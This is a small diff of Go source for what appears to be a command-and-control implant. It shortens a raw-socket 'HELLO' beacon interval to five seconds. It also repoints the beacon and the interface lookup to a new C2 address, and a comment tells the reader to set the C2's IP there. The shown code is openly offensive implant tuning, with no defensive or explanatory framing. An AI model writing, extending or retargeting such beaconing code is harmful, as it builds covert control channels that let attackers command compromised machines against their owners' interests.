@@ -371,7 +371,7 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 		SendPacket(fd, iface, addr, packet)
 		fmt.Println("[+] Sent HELLO")
 		// Send hello every 5 seconds
-		time.Sleep(50 * time.Second)
+		time.Sleep(5 * time.Second)
 	}
 }
 
@@ -434,7 +434,7 @@ func main() {
 	fmt.Println("[+] Socket created")
 
 	// Get information that is needed for networking
-	iface, src := GetOutwardIface("192.168.6.104:80")
+	iface, src := GetOutwardIface("10.96.239.7:80")
 	fmt.Println("[+] Using interface:", iface.Name)
 
 	dstMAC, err := GetRouterMAC()
@@ -447,7 +447,7 @@ func main() {
 	// Start hello timer
 	// Set the below IP to the IP of the C2
 	// 192.168.4.6
-	go sendHello(iface, src, net.IPv4(192, 168, 6, 104), dstMAC)
+	go sendHello(iface, src, net.IPv4(10, 96, 239, 7), dstMAC)
 
 	// Listen for responses
 	fmt.Println("[+] Listening")
